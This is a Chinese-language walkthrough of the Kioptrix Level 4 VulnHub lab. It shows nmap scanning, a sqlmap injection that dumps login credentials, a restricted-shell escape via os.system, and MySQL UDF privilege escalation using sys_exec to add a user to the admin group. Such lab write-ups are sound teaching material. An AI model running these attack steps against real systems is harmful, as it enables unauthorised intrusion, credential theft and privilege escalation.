# Kioptrix4-WalkThrough

> 笔记内容由 [xidaner](https://github.com/xidaner) 提供,仅做部分内容排版修改

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**靶机地址**
- https://www.vulnhub.com/entry/kioptrix-level-13-4,25/

**Description**

```
Again a long delay between VMs, but that cannot be helped. Work, family must come first. Blogs and hobbies are pushed down the list. These things aren’t as easy to make as one may think. Time and some planning must be put into these challenges, to make sure that:

1. It’s possible to get root remotely [ Edit: sorry not what I meant ]

1a. It’s possible to remotely compromise the machine

    Stays within the target audience of this site

    Must be “realistic” (well kinda…)

    Should serve as a refresher for me. Be it PHP or MySQL usage etc. Stuff I haven’t done in a while.

I also had lots of troubles exporting this one. So please take the time to read my comments at the end of this post.

Keeping in the spirit of things, this challenge is a bit different than the others but remains in the realm of the easy. Repeating myself I know, but things must always be made clear: These VMs are for the beginner. It’s a place to start.

I’d would love to code some small custom application for people to exploit. But I’m an administrator not a coder. It would take too much time to learn/code such an application. Not saying I’ll never try doing one, but I wouldn’t hold my breath. If someone wants more difficult challenges, I’m sure the Inter-tubes holds them somewhere. Or you can always enroll in Offsec’s PWB course. *shameless plug

-- A few things I must say. I made this image using a new platform. Hoping everything works but I can’t test for everything. Initially the VM had troubles getting an IP on boot-up. For some reason the NIC wouldn’t go up and the machine was left with the loopback interface. I hope that I fixed the problem. Don’t be surprised if it takes a little moment for this one to boot up. It’s trying to get an IP. Be a bit patient. Someone that tested the image for me also reported the VM hung once powered on. Upon restart all was fine. Just one person reported this, so hoping it’s not a major issue. If you plan on running this on vmFusion, you may need to convert the imagine to suit your fusion version.

-- Also adding the VHD file for download, for those using Hyper-V. You guys may need to change the network adapter to “Legacy Network Adapter”. I’ve test the file and this one seems to run fine for me… If you’re having problems, or it’s not working for any reason email comms[=]kioptrix.com

Thanks to @shai_saint from www.n00bpentesting.com for the much needed testing with various VM solutions.

Thanks to Patrick from Hackfest.ca for also running the VM and reporting a few issues. And Swappage & @Tallenz for doing the same. All help is appreciated guys

So I hope you enjoy this one.

The Kioptrix Team

Source: http://www.kioptrix.com/blog/?p=604

**Note: Just a virtual hard drive. You'll need to create a new virtual machine & attach the existing hard drive**
```

**知识点**
- SQL 注入
- mysql udf 提权

---

# 前期-信息收集
## nmap

开机后我们发现 这个用户名和密码是不知道的

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/1.png)

在虚拟机中要先接入到和 kali 一个网段中.然后我们要知道这个虚拟机的 ip 地址,就要用到 IP 探活.

```
nmap -sP <你虚拟机网卡的网段> /24
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/2.png)

可以发现网段中一共有 4 个 ip 地址,除去本机和 kali 剩下的就是靶机的 ip 地址

---

## 扫描开放端口

```
nmap 192.168.17.130
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/3.png)

可以发现,目标打开了 80 端口

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/4.png)

目测可以注入,尝试了简单 payload,下面选择直接跑 sqlmap

---
---
---

# 中期-漏洞利用
## sql注入

代码:

```
sqlmap -u http://192.168.17.130/checklogin.php
--data="myusername=admin&mypassword=123&Submit=Login" -p mypassword --dump -T members -D members
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/9.png)

```
 id | username | password              |
+----+----------+-----------------------+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
```

---
---
---

# 后期-拿shell-提权
## 尝试 SSH 登陆

输入用户名和密码登陆进去

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/10.png)

这里用了 echo 命令获取交互 shell
```
echo os.system("/bin/bash")
whoami
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/11.png)

查看服务器下的文件
```
cd /var/www/
cat checklogin.php
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/12.png)

---

## 登陆 MYSQL

```
mysql -u root -p
```

---

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/13.png)

## mysql UDF 提权

在 mysql 中输入
```
select sys_exec('usermod -a -G admin john');
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/18.png)

在我们退出去后,尝试登陆到 root

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Kioptrix/Kioptrix4/19.png)

`whoami` 确认获取 `root`

提权成功,感谢 Kioptrix Team 制作靶机

---

# 补充

**扫描 smb**

目标开放 139 445 这意味着可能可以枚举用户名

`nmap -sC --script smb-enum-users.nse <目标IP>`

`enum4linux <目标IP>`

这2个命令都可以

**udf 提权**

需要 udf 提权,需要检查 mysql 是否以 root 权限运行
```
ls -la /usr/lib/lib_mysqludf_sys.so
```
